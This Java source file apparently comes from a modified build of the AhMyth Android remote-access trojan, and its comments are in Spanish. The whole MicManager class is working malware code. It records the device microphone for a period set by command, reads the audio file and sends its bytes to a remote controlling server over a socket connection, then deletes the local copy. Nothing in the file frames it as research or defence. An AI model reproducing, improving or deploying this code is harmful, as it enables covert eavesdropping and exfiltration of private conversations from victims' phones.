package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {

    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MIC";
    static TimerTask stopRecording;
    static boolean isRecording = false;  // Flag para evitar grabaciones simultáneas

    private static boolean hasMicPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return true;
        }
    }

    // Método público para verificar si hay grabación activa
    public static boolean isRecording() {
        return isRecording;
    }

    public static void startRecording(int sec) throws Exception {
        Context context = MainService.getContextOfApplication();

        Log.e(TAG, "Intentando iniciar grabación de micrófono por " + sec + " segundos");

        // Verificar si ya hay una grabación activa
        if (isRecording) {
            Log.e(TAG, "❌ Ya hay una grabación activa, rechazando nueva solicitud");
            JSONObject object = new JSONObject();
            try {
                object.put("file", false);
                object.put("error", "Recording already in progress");
            } catch (JSONException e) {
                Log.e(TAG, "Error creando JSON de error", e);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            return;
        }

        if (!hasMicPermission(context)) {
            JSONObject object = new JSONObject();
            try {
                object.put("file", false);
                object.put("error", "RECORD_AUDIO permission not granted");
            } catch (JSONException e) {
                Log.e(TAG, "Error creando JSON de permiso", e);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            Log.e(TAG, "❌ Permiso RECORD_AUDIO no otorgado");
            return;
        }

        // Creating file
        File dir = context.getCacheDir();
        try {
            Log.e(TAG, "Directorio de caché: " + dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
            Log.e(TAG, "✅ Archivo temporal de audio creado: " + audiofile.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "❌ Error acceso almacenamiento: " + e.getMessage());
            JSONObject object = new JSONObject();
            try {
                object.put("file", false);
                object.put("error", "Storage access error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creando JSON de storage", ee);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            return;
        }

        recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            
            isRecording = true;  // Marcar como grabando
            Log.e(TAG, "✅ Grabación iniciada correctamente");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error en MediaRecorder prepare/start: " + e.getMessage());
            isRecording = false;  // Liberar flag si hay error
            JSONObject object = new JSONObject();
            try {
                object.put("file", false);
                object.put("error", "MediaRecorder error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creando JSON de error", ee);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            return;
        }

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                try {
                    if (recorder != null) {
                        recorder.stop();
                        Log.e(TAG, "⏹ Grabación detenida");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error al detener grabación: " + e.getMessage());
                }
                try {
                    if (recorder != null) {
                        recorder.release();
                        recorder = null;
                        Log.e(TAG, "✅ Recorder liberado");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error al liberar recorder: " + e.getMessage());
                }
                
                isRecording = false;  // Marcar como no grabando
                
                if (audiofile != null && audiofile.exists()) {
                    sendVoice(audiofile);
                    audiofile.delete();
                    Log.e(TAG, "✅ Archivo de audio eliminado después de enviar");
                }
            }
        };

        new Timer().schedule(stopRecording, sec * 1000);
        Log.e(TAG, "✅ Timer programado para detener grabación en " + sec + " segundos");
    }

    private static void sendVoice(File file) {
        int size = (int) file.length();
        byte[] data = new byte[size];
        try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file))) {
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            Log.e(TAG, "✅ Audio enviado al servidor (" + size + " bytes)");
        } catch (IOException | JSONException e) {
            Log.e(TAG, "❌ Error al enviar audio: " + e.getMessage());
            JSONObject object = new JSONObject();
            try {
                object.put("file", false);
                object.put("error", "Send audio error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creando JSON de error", ee);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
        }
    }
}